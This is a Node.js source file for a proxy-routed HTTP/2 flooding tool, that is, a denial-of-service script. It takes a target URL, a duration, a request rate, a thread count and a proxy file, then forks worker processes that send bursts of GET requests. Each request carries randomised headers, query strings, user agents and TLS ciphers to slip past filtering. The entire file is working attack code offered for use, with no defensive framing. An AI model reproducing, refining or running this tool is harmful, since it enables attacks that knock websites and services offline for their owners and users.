// Core dependencies
const net = require('net');
const http2 = require('http2');
const tls = require('tls');
const cluster = require('cluster');
const url = require('url');
const crypto = require('crypto');
const fs = require('fs').promises; // Sử dụng Promise-based fs
const EventEmitter = require('events');

// Configuration constants
const CONFIG = {
    MAX_LISTENERS: 0,
    DEFAULT_TIMEOUT: 100000,
    KEEP_ALIVE_INTERVAL: 60000,
    MAX_CONCURRENT_STREAMS: 2000,
};

// Utility class for helper functions
class Utils {
    static randomInt(min, max) {
        return Math.floor(Math.random() * (max - min) + min);
    }

    static randomElement(array) {
        return array[this.randomInt(0, array.length)];
    }

    static generateRandomString(length) {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        return Array(length)
            .fill()
            .map(() => chars.charAt(Math.floor(Math.random() * chars.length)))
            .join('');
    }

    static spoofIP() {
        return Array(4)
            .fill()
            .map(() => Math.floor(Math.random() * 255))
            .join('.');
    }
}

// Request headers configuration
class HeaderFactory {
    static signatures = [
        'ecdsa_secp256r1_sha256',
        'ecdsa_secp384r1_sha384',
        'ecdsa_secp521r1_sha512',
        'rsa_pss_rsae_sha256',
        'rsa_pss_rsae_sha384',
        'rsa_pss_rsae_sha512',
        'rsa_pkcs1_sha256',
        'rsa_pkcs1_sha384',
        'rsa_pkcs1_sha512'
    ];

    static ciphers = [
        "ECDHE-ECDSA-AES128-GCM-SHA256:HIGH:MEDIUM:3DES",
        "ECDHE-ECDSA-AES256-GCM-SHA384:HIGH:MEDIUM:3DES",
        "ECDHE-ECDSA-CHACHA20-POLY1305-OLD:HIGH:MEDIUM:3DES"
    ];

    static userAgents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5623.200 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.221 Safari/537.36"
    ];

    static getRandomHeaders(target) {
        return {
            ':method': 'GET',
            ':authority': target.host,
            ':path': `${target.path}?${Utils.generateRandomString(5)}=${Utils.generateRandomString(25)}`,
            ':scheme': 'https',
            'accept': Utils.randomElement([
                "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
            ]),
            'user-agent': Utils.randomElement(this.userAgents),
            'accept-encoding': 'gzip, deflate, br',
            'cache-control': Utils.randomElement(['no-cache', 'max-age=0']),
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
        };
    }
}

// Main flooder class
class Flooder {
    constructor({ target, time, rate, threads, proxyFile }) {
        this.target = url.parse(target);
        this.duration = time * 1000;
        this.rate = rate;
        this.threads = threads;
        this.proxies = [];
        this.proxyFile = proxyFile;
        this.isRunning = false;
    }

    async initialize() {
        try {
            const proxyData = await fs.readFile(this.proxyFile, 'utf-8');
            this.proxies = proxyData.split(/\r?\n/).filter(Boolean);
            
            EventEmitter.defaultMaxListeners = CONFIG.MAX_LISTENERS;
            process.setMaxListeners(CONFIG.MAX_LISTENERS);
            
            process.on('uncaughtException', (err) => {
                console.error('Uncaught Exception:', err.message);
            });
        } catch (error) {
            throw new Error(`Initialization failed: ${error.message}`);
        }
    }

    async start() {
        if (this.isRunning) return;
        this.isRunning = true;

        if (cluster.isMaster) {
            for (let i = 0; i < this.threads; i++) {
                cluster.fork();
            }
        } else {
            await this.runWorker();
        }

        setTimeout(() => this.stop(), this.duration);
    }

    stop() {
        this.isRunning = false;
        process.exit(0);
    }

    async runWorker() {
        const socket = new NetSocket();
        while (this.isRunning) {
            await this.flood(socket);
        }
    }

    async flood(socket) {
        const proxy = Utils.randomElement(this.proxies).split(':');
        const headers = HeaderFactory.getRandomHeaders(this.target);

        try {
            const connection = await socket.connect({
                host: proxy[0],
                port: parseInt(proxy[1]),
                address: `${this.target.host}:443`,
                timeout: CONFIG.DEFAULT_TIMEOUT
            });

            const tlsConn = this.createTlsConnection(connection);
            const client = this.createHttp2Client(tlsConn);

            this.launchAttack(client, headers);
        } catch (error) {
            console.error(`Flood error: ${error.message}`);
        }
    }

    createTlsConnection(connection) {
        return tls.connect({
            host: this.target.host,
            port: 443,
            ALPNProtocols: ['h2'],
            socket: connection,
            ciphers: Utils.randomElement(HeaderFactory.ciphers),
            secureProtocol: 'TLS_method',
            rejectUnauthorized: false,
        }).setKeepAlive(true, CONFIG.KEEP_ALIVE_INTERVAL);
    }

    createHttp2Client(tlsConn) {
        return http2.connect(this.target.href, {
            protocol: 'https:',
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: CONFIG.MAX_CONCURRENT_STREAMS,
                initialWindowSize: 65535,
                maxHeaderListSize: 65536,
                enablePush: false
            },
            createConnection: () => tlsConn
        });
    }

    launchAttack(client, headers) {
        client.on('connect', () => {
            setInterval(() => {
                for (let i = 0; i < this.rate; i++) {
                    const request = client.request(headers)
                        .on('response', () => {
                            request.close();
                            request.destroy();
                        })
                        .end();
                }
            }, 1000);
        });

        client.on('error', (err) => {
            client.destroy();
            console.error(`Client error: ${err.message}`);
        });
    }
}

// NetSocket class with improved connection handling
class NetSocket {
    async connect(options) {
        return new Promise((resolve, reject) => {
            const payload = `CONNECT ${options.address} HTTP/1.1\r\nHost: ${options.address}\r\nConnection: Keep-Alive\r\n\r\n`;
            const connection = net.connect({
                host: options.host,
                port: options.port
            });

            connection.setTimeout(options.timeout);
            connection.setKeepAlive(true, CONFIG.KEEP_ALIVE_INTERVAL);

            connection.on('connect', () => {
                connection.write(Buffer.from(payload));
            });

            connection.on('data', (chunk) => {
                if (chunk.toString('utf-8').includes('HTTP/1.1 200')) {
                    resolve(connection);
                } else {
                    connection.destroy();
                    reject(new Error('Invalid proxy response'));
                }
            });

            connection.on('error', (err) => {
                connection.destroy();
                reject(err);
            });

            connection.on('timeout', () => {
                connection.destroy();
                reject(new Error('Connection timeout'));
            });
        });
    }
}

// Main execution
async function main() {
    if (process.argv.length < 7) {
        console.log('Usage: node script.js target time rate threads proxyfile');
        process.exit(1);
    }

    const flooder = new Flooder({
        target: process.argv[2],
        time: parseInt(process.argv[3]),
        rate: parseInt(process.argv[4]),
        threads: parseInt(process.argv[5]),
        proxyFile: process.argv[6]
    });

    try {
        await flooder.initialize();
        await flooder.start();
    } catch (error) {
        console.error(`Startup error: ${error.message}`);
        process.exit(1);
    }
}

main().catch(console.error);